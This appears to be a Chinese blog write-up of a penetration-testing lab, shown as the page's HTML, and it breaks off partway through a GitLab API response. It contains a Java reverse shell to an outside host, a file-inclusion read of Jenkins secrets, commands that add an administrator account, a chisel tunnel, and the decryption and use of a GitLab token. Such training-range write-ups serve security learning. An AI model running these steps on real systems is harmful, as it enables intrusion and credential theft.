@@ -1,0 +1,1089 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>privilege - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <div class="c-post__toc-empty">
+            <i class="fas fa-info-circle"></i> 本文暂无小节
+        </div>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">privilege</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                春秋云镜靶场
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><p><code>fscan-ip 39.101.180.135</code></p>
+<p>服务开的挺多</p>
+<p>不知道是不是兔子</p>
+<p>8080有Jenkins</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419141254.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419141254.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><code>www.zip</code>备份文件</p>
+<p>可以文件包含</p>
+<p>读取<code>C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword</code></p>
+<p>配置文件</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">http://39.101.180.135/tools/content-log.php?logfile=C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword
+</span></span></code></pre></div></div><p>读出来这个密码<code>510235cf43f14e83b88a9f144199655b</code></p>
+<p><code>admin:510235cf43f14e83b88a9f144199655b</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">String host=&#34;8.149.142.195&#34;;
+</span></span><span class="line"><span class="cl">int port=9999;
+</span></span><span class="line"><span class="cl">String cmd=&#34;cmd.exe&#34;;
+</span></span><span class="line"><span class="cl">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+</span></span><span class="line"><span class="cl">Socket s=new Socket(host,port);
+</span></span><span class="line"><span class="cl">InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+</span></span><span class="line"><span class="cl">OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+</span></span><span class="line"><span class="cl">while(!s.isClosed()){
+</span></span><span class="line"><span class="cl">  while(pi.available()&gt;0)so.write(pi.read());
+</span></span><span class="line"><span class="cl">  while(pe.available()&gt;0)so.write(pe.read());
+</span></span><span class="line"><span class="cl">  while(si.available()&gt;0)po.write(si.read());so.flush();
+</span></span><span class="line"><span class="cl">  po.flush();
+</span></span><span class="line"><span class="cl">  Thread.sleep(50);
+</span></span><span class="line"><span class="cl">  try {p.exitValue();break;}catch (Exception e){}
+</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl">p.destroy();
+</span></span><span class="line"><span class="cl">s.close();
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>jenkins弹shell,但是这个好不稳定,换个办法吧</p>
+<p>先传上去文件,上msf</p>
+<p><code>https://8.149.142.195:60000/api/v1/d/?en=YREusySZWyqgi5vtf1n1XQ%3D%3D</code></p>
+<p>巨奇怪,传上去不能执行,卡的死死的,然后弹shell也不能执行命令,无语</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">println &#34;net user dionysus QWE123qwe. /add&#34;.execute().text
+</span></span><span class="line"><span class="cl">println &#34;net localgroup administrators dionysus /add&#34;.execute().text
+</span></span></code></pre></div></div><p>内网地址<code>172.22.14.7</code></p>
+<p>fscan开始扫描</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.22.14.11:445 open
+</span></span><span class="line"><span class="cl">172.22.14.7:8080 open
+</span></span><span class="line"><span class="cl">172.22.14.7:3306 open
+</span></span><span class="line"><span class="cl">172.22.14.31:1521 open
+</span></span><span class="line"><span class="cl">172.22.14.46:445 open
+</span></span><span class="line"><span class="cl">172.22.14.31:445 open
+</span></span><span class="line"><span class="cl">172.22.14.7:135 open
+</span></span><span class="line"><span class="cl">172.22.14.46:80 open
+</span></span><span class="line"><span class="cl">172.22.14.16:80 open
+</span></span><span class="line"><span class="cl">172.22.14.7:80 open
+</span></span><span class="line"><span class="cl">172.22.14.16:22 open
+</span></span><span class="line"><span class="cl">172.22.14.11:88 open
+</span></span><span class="line"><span class="cl">172.22.14.16:8060 open
+</span></span><span class="line"><span class="cl">172.22.14.46:135 open
+</span></span><span class="line"><span class="cl">172.22.14.7:445 open
+</span></span><span class="line"><span class="cl">172.22.14.46:139 open
+</span></span><span class="line"><span class="cl">172.22.14.31:135 open
+</span></span><span class="line"><span class="cl">172.22.14.31:139 open
+</span></span><span class="line"><span class="cl">172.22.14.11:135 open
+</span></span><span class="line"><span class="cl">172.22.14.11:139 open
+</span></span><span class="line"><span class="cl">172.22.14.7:139 open
+</span></span><span class="line"><span class="cl">172.22.14.16:9094 open
+</span></span><span class="line"><span class="cl">[*] NetInfo 
+</span></span><span class="line"><span class="cl">[*]172.22.14.7
+</span></span><span class="line"><span class="cl">   [-&gt;]XR-JENKINS
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.14.7
+</span></span><span class="line"><span class="cl">[*] NetInfo 
+</span></span><span class="line"><span class="cl">[*]172.22.14.31
+</span></span><span class="line"><span class="cl">   [-&gt;]XR-ORACLE
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.14.31
+</span></span><span class="line"><span class="cl">[*] NetBios 172.22.14.46    XIAORANG\XR-0923              
+</span></span><span class="line"><span class="cl">[*] WebTitle http://172.22.14.16:8060  code:404 len:555    title:404 Not Found
+</span></span><span class="line"><span class="cl">[*] NetInfo 
+</span></span><span class="line"><span class="cl">[*]172.22.14.46
+</span></span><span class="line"><span class="cl">   [-&gt;]XR-0923
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.14.46
+</span></span><span class="line"><span class="cl">[*] WebTitle http://172.22.14.7:8080   code:403 len:548    title:None
+</span></span><span class="line"><span class="cl">[*] NetInfo 
+</span></span><span class="line"><span class="cl">[*]172.22.14.11
+</span></span><span class="line"><span class="cl">   [-&gt;]XR-DC
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.14.11
+</span></span><span class="line"><span class="cl">[*] NetBios 172.22.14.11    [+] DC:XIAORANG\XR-DC          
+</span></span><span class="line"><span class="cl">[*] NetBios 172.22.14.31    WORKGROUP\XR-ORACLE           
+</span></span><span class="line"><span class="cl">[*] WebTitle http://172.22.14.46       code:200 len:703    title:IIS Windows Server
+</span></span><span class="line"><span class="cl">[*] WebTitle http://172.22.14.7        code:200 len:54603  title:XR SHOP
+</span></span><span class="line"><span class="cl">[*] WebTitle http://172.22.14.16       code:302 len:99     title:None 跳转url: http://172.22.14.16/users/sign_in
+</span></span><span class="line"><span class="cl">[*] WebTitle http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">(icmp) Target 172.22.14.7     is alive 本机
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.14.11    is alive [+] DC:XIAORANG\XR-DC
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.14.16    is alive web
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.14.31    is alive WORKGROUP\XR-ORACLE
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.14.46    is alive XIAORANG\XR-0923
+</span></span></code></pre></div></div><p>挂个代理</p>
+<p><code>.\chisel.exe client 8.149.142.195:7000 R:0.0.0.0:7777:socks</code></p>
+<p>打这个<code>172.22.14.16</code></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419144446.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419144446.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><code>C:/ProgramData/Jenkins/.jenkins/credentials.xml</code></p>
+<p>管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">&lt;?xml version=&#39;1.1&#39; encoding=&#39;UTF-8&#39;?&gt;
+</span></span><span class="line"><span class="cl">&lt;com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin=&#34;credentials@1214.v1de940103927&#34;&gt;
+</span></span><span class="line"><span class="cl">  &lt;domainCredentialsMap class=&#34;hudson.util.CopyOnWriteMap$Hash&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;entry&gt;
+</span></span><span class="line"><span class="cl">      &lt;com.cloudbees.plugins.credentials.domains.Domain&gt;
+</span></span><span class="line"><span class="cl">        &lt;specifications/&gt;
+</span></span><span class="line"><span class="cl">      &lt;/com.cloudbees.plugins.credentials.domains.Domain&gt;
+</span></span><span class="line"><span class="cl">      &lt;java.util.concurrent.CopyOnWriteArrayList&gt;
+</span></span><span class="line"><span class="cl">        &lt;com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl plugin=&#34;gitlab-plugin@1.6.0&#34;&gt;
+</span></span><span class="line"><span class="cl">          &lt;scope&gt;GLOBAL&lt;/scope&gt;
+</span></span><span class="line"><span class="cl">          &lt;id&gt;9eca4a05-e058-4810-b952-bd6443e6d9a8&lt;/id&gt;
+</span></span><span class="line"><span class="cl">          &lt;description&gt;&lt;/description&gt;
+</span></span><span class="line"><span class="cl">          &lt;apiToken&gt;{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}&lt;/apiToken&gt;
+</span></span><span class="line"><span class="cl">        &lt;/com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl&gt;
+</span></span><span class="line"><span class="cl">      &lt;/java.util.concurrent.CopyOnWriteArrayList&gt;
+</span></span><span class="line"><span class="cl">    &lt;/entry&gt;
+</span></span><span class="line"><span class="cl">  &lt;/domainCredentialsMap&gt;
+</span></span><span class="line"><span class="cl">&lt;/com.cloudbees.plugins.credentials.SystemCredentialsProvider&gt;
+</span></span></code></pre></div></div><p><code>{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}</code>token在此</p>
+<p><code>println(hudson.util.Secret.fromString(&quot;{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}&quot;).getPlainText())</code></p>
+<p>回去jenkins解得<code>glpat-7kD_qLH2PiQv_ywB9hz2</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">p4 curl --header &#34;PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2&#34; &#34;http://172.22.14.16/api/v4/projects&#34;
+</span></span></code></pre></div></div><p>得到一堆</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">[
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        &#34;id&#34;: 6,
+</span></span><span class="line"><span class="cl">        &#34;description&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;name&#34;: &#34;Internal Secret&#34;,
+</span></span><span class="line"><span class="cl">        &#34;name_with_namespace&#34;: &#34;XRLAB / Internal Secret&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path&#34;: &#34;internal-secret&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path_with_namespace&#34;: &#34;xrlab/internal-secret&#34;,
+</span></span><span class="line"><span class="cl">        &#34;created_at&#34;: &#34;2022-12-25T08:30:12.362Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;default_branch&#34;: &#34;main&#34;,
+</span></span><span class="line"><span class="cl">        &#34;tag_list&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;topics&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;ssh_url_to_repo&#34;: &#34;git@gitlab.xiaorang.lab:xrlab/internal-secret.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;http_url_to_repo&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/internal-secret.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/internal-secret&#34;,
+</span></span><span class="line"><span class="cl">        &#34;readme_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;avatar_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;forks_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;star_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;last_activity_at&#34;: &#34;2022-12-25T08:30:12.362Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;namespace&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;id&#34;: 8,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;XRLAB&#34;,
+</span></span><span class="line"><span class="cl">            &#34;path&#34;: &#34;xrlab&#34;,
+</span></span><span class="line"><span class="cl">            &#34;kind&#34;: &#34;group&#34;,
+</span></span><span class="line"><span class="cl">            &#34;full_path&#34;: &#34;xrlab&#34;,
+</span></span><span class="line"><span class="cl">            &#34;parent_id&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;avatar_url&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/groups/xrlab&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;_links&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;self&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/6&#34;,
+</span></span><span class="line"><span class="cl">            &#34;issues&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/6/issues&#34;,
+</span></span><span class="line"><span class="cl">            &#34;merge_requests&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/6/merge_requests&#34;,
+</span></span><span class="line"><span class="cl">            &#34;repo_branches&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/6/repository/branches&#34;,
+</span></span><span class="line"><span class="cl">            &#34;labels&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/6/labels&#34;,
+</span></span><span class="line"><span class="cl">            &#34;events&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/6/events&#34;,
+</span></span><span class="line"><span class="cl">            &#34;members&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/6/members&#34;,
+</span></span><span class="line"><span class="cl">            &#34;cluster_agents&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/6/cluster_agents&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;packages_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;empty_repo&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;archived&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;visibility&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;resolve_outdated_diff_discussions&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;container_expiration_policy&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;cadence&#34;: &#34;1d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;enabled&#34;: false,
+</span></span><span class="line"><span class="cl">            &#34;keep_n&#34;: 10,
+</span></span><span class="line"><span class="cl">            &#34;older_than&#34;: &#34;90d&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex&#34;: &#34;.*&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name_regex_keep&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;next_run_at&#34;: &#34;2022-12-26T08:30:12.373Z&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;issues_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;wiki_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;jobs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;snippets_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;service_desk_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;service_desk_address&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;can_create_merge_request_in&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;issues_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;repository_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;merge_requests_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;forking_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;wiki_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;builds_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;snippets_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;pages_access_level&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;operations_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;analytics_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;container_registry_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;security_and_compliance_access_level&#34;: &#34;private&#34;,
+</span></span><span class="line"><span class="cl">        &#34;releases_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;environments_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;feature_flags_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;infrastructure_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;monitor_access_level&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;emails_disabled&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_runners_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;lfs_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;creator_id&#34;: 2,
+</span></span><span class="line"><span class="cl">        &#34;import_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;import_type&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;import_status&#34;: &#34;none&#34;,
+</span></span><span class="line"><span class="cl">        &#34;open_issues_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;ci_default_git_depth&#34;: 20,
+</span></span><span class="line"><span class="cl">        &#34;ci_forward_deployment_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_job_token_scope_enabled&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_separated_caches&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;ci_opt_in_jwt&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;ci_allow_fork_pipelines_to_run_in_parent_project&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;public_jobs&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;build_timeout&#34;: 3600,
+</span></span><span class="line"><span class="cl">        &#34;auto_cancel_pending_pipelines&#34;: &#34;enabled&#34;,
+</span></span><span class="line"><span class="cl">        &#34;ci_config_path&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;shared_with_groups&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_pipeline_succeeds&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;allow_merge_on_skipped_pipeline&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;restrict_user_defined_variables&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;request_access_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;only_allow_merge_if_all_discussions_are_resolved&#34;: false,
+</span></span><span class="line"><span class="cl">        &#34;remove_source_branch_after_merge&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;printing_merge_request_link_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;merge_method&#34;: &#34;merge&#34;,
+</span></span><span class="line"><span class="cl">        &#34;squash_option&#34;: &#34;default_off&#34;,
+</span></span><span class="line"><span class="cl">        &#34;enforce_auth_checks_on_uploads&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;suggestion_commit_message&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;merge_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;squash_commit_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;issue_branch_template&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;auto_devops_enabled&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;auto_devops_deploy_strategy&#34;: &#34;continuous&#34;,
+</span></span><span class="line"><span class="cl">        &#34;autoclose_referenced_issues&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;keep_latest_artifact&#34;: true,
+</span></span><span class="line"><span class="cl">        &#34;runner_token_expiration_interval&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;permissions&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;project_access&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;group_access&#34;: {
+</span></span><span class="line"><span class="cl">                &#34;access_level&#34;: 50,
+</span></span><span class="line"><span class="cl">                &#34;notification_level&#34;: 3
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    },
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        &#34;id&#34;: 4,
+</span></span><span class="line"><span class="cl">        &#34;description&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;name&#34;: &#34;XRAdmin&#34;,
+</span></span><span class="line"><span class="cl">        &#34;name_with_namespace&#34;: &#34;XRLAB / XRAdmin&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path&#34;: &#34;xradmin&#34;,
+</span></span><span class="line"><span class="cl">        &#34;path_with_namespace&#34;: &#34;xrlab/xradmin&#34;,
+</span></span><span class="line"><span class="cl">        &#34;created_at&#34;: &#34;2022-12-25T07:48:16.751Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;default_branch&#34;: &#34;main&#34;,
+</span></span><span class="line"><span class="cl">        &#34;tag_list&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;topics&#34;: [
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;ssh_url_to_repo&#34;: &#34;git@gitlab.xiaorang.lab:xrlab/xradmin.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;http_url_to_repo&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/xradmin.git&#34;,
+</span></span><span class="line"><span class="cl">        &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/xradmin&#34;,
+</span></span><span class="line"><span class="cl">        &#34;readme_url&#34;: &#34;http://gitlab.xiaorang.lab/xrlab/xradmin/-/blob/main/README.md&#34;,
+</span></span><span class="line"><span class="cl">        &#34;avatar_url&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;forks_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;star_count&#34;: 0,
+</span></span><span class="line"><span class="cl">        &#34;last_activity_at&#34;: &#34;2023-05-30T10:27:31.762Z&#34;,
+</span></span><span class="line"><span class="cl">        &#34;namespace&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;id&#34;: 8,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;XRLAB&#34;,
+</span></span><span class="line"><span class="cl">            &#34;path&#34;: &#34;xrlab&#34;,
+</span></span><span class="line"><span class="cl">            &#34;kind&#34;: &#34;group&#34;,
+</span></span><span class="line"><span class="cl">            &#34;full_path&#34;: &#34;xrlab&#34;,
+</span></span><span class="line"><span class="cl">            &#34;parent_id&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;avatar_url&#34;: null,
+</span></span><span class="line"><span class="cl">            &#34;web_url&#34;: &#34;http://gitlab.xiaorang.lab/groups/xrlab&#34;
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;_links&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;self&#34;: &#34;http://gitlab.xiaorang.lab/api/v4/projects/4&#34;,
